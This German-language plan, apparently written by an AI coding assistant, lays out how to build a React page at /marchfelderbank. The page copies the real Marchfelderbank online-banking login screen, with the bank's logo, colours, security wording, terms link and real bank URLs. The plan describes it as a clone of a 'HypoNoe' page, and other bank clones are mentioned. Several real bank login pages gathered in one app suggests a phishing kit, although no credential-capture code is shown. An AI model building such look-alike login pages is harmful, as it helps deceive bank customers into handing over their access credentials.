

## Neue Seite `/marchfelderbank` — Kopie von HypoNoe mit Anpassungen

### Vorbereitungen
1. **Assets kopieren** — `user-uploads://logo-5.png` → `src/assets/marchfelderbank-logo.png`, `user-uploads://marchfelder.png` → `src/assets/marchfelderbank-bg.png`
2. **Route** — `/marchfelderbank` in `src/App.tsx`

### Neue Datei: `src/pages/Marchfelderbank.tsx`
Komplettkopie von `HypoNoe.tsx`, eigenständig, mit folgenden Änderungen:

1. **Imports** — Logo und Hintergrundbild auf `marchfelderbank-logo.png` / `marchfelderbank-bg.png`, `Info` Import entfernen

2. **State** — `lang` State hinzufügen (`"de" | "en"`)

3. **Header-Hintergrund** — `backgroundColor: "#fff"` → `backgroundColor: "#87be42"`

4. **Login Header Bar** — Text: `"Login"` (DE und EN), Hintergrund `#87be42`

5. **Info-Text** — DE: `"Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten."` — EN: `"You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret."` — Sicherheitsempfehlungen-Absatz entfernen

6. **Sprachwechsel** — Link "English"/"Deutsch" in `#87be42` neben Benutzername-Label (wie bei Spardabank/Dadatbank)

7. **Input-Fokus-Farben** — `#87be42` für borderColor, boxShadow, X-Icon; Fokus-Hintergrund passend (z.B. `#e8f5d3`). **Unfokussiert**: `borderColor: "#f1f1f1"` (gleiche Farbe wie Hintergrund `#f1f1f1`), damit Outline unsichtbar ist

8. **"Sie melden sich zum ersten Mal an?"** — Farbe `#87be42`, redirect zu `https://banking.marchfelderbank.at/banking/erstlogin2c/erstlogin2c.xhtml`, EN: `"You are logging in for the first time?"`

9. **AGB-Text** — DE: `Durch Eingabe Ihrer Login-Daten stimmen Sie den "Allgemeinen Geschäftsbedingungen (AGB)" ausdrücklich zu.` — nur "Allgemeinen Geschäftsbedingungen (AGB)" (mit Anführungszeichen) verlinkt zu `http://www.marchfelderbank.at/agb?lang=de` in `#87be42`. EN: Text ausblenden

10. **Weiter-Button** — Hintergrund `#87be42`, Text: DE `"Weiter"`, EN `"Continue"`

11. **Links unten** (alle in `#87be42`):
    - `"Benutzername vergessen?"` / `"Forgot username?"` → `https://banking.marchfelderbank.at/banking/login.xhtml?m=40#`
    - `"Demo-Version"` / `"Try demo"` (ohne Info-Icon) → `https://banking.marchfelderbank.at/banking/login.xhtml?signature=12345&demo=true&loginToken=1234`

### Datei: `src/App.tsx`
- Import `Marchfelderbank` und Route `/marchfelderbank` hinzufügen

